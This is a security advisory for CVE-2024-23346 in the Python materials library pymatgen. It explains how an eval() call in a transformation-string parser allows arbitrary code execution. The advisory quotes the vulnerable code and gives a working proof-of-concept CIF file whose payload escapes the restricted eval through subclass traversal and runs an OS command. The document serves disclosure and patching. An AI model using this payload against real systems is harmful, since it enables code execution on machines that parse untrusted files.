# [C] pymatgen vulnerable to arbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string

## Summary
Severity: Critical
Advisory: GHSA-vgv8-5cpj-qj2f
CVE: CVE-2024-23346
CWE: CWE-77
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2024-02-21
Source: https://github.com/advisories/GHSA-vgv8-5cpj-qj2f
Type: github-advisory

## Affected
- PyPI: `pymatgen` — affected >=0 <2024.2.20

## Details
### Summary
A critical security vulnerability exists in the `JonesFaithfulTransformation.from_transformation_str()` method within the `pymatgen` library. This method insecurely utilizes eval() for processing input, enabling execution of arbitrary code when parsing untrusted input. This can be exploited when parsing a maliciously-created CIF file.

### Details
The cause of the vulnerability is in [pymatgen/symmetry/settings.py#L97C1-L111C108](https://github.com/materialsproject/pymatgen/blob/master/pymatgen/symmetry/settings.py#L97C1-L111C108). The flawed code segment involves a regular expression operation followed by the use of `eval()`.

#### Vulnerable code

```py
basis_change = [
    re.sub(r"(?<=\w|\))(?=\() | (?<=\))(?=\w) | (?<=(\d|a|b|c))(?=([abc]))", r"*", string, flags=re.X)
    for string in basis_change
]
"""snip"""
([eval(x, {"__builtins__": None}, {"a": a, "b": b, "c": c}) for x in basis_change])
```

The use of eval, even with `__builtins__` set to `None`, is still a security risk. The `BuiltinImporter` class can be recovered with subclass traversal.

### PoC

The vulnerability can be exploited as follows:

Create a file `vuln.cif` with the following contents:

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Then, parse the cif file with the following code:
```py
from pymatgen.io.cif import CifParser
parser = CifParser("vuln.cif")
structure = parser.parse_structures()
```

### Credits

This vulnerability was found and disclosed by [William Khem-Marquez](https://github.com/SteakEnthusiast).

## References
- https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f
- https://nvd.nist.gov/vuln/detail/CVE-2024-23346
- https://github.com/materialsproject/pymatgen/commit/c231cbd3d5147ee920a37b6ee9dd236b376bcf5a
- https://github.com/materialsproject/pymatgen
- https://github.com/materialsproject/pymatgen/blob/master/pymatgen/symmetry/settings.py#L97C1-L111C108
- https://github.com/pypa/advisory-database/tree/main/vulns/pymatgen/PYSEC-2024-226.yaml
- https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346
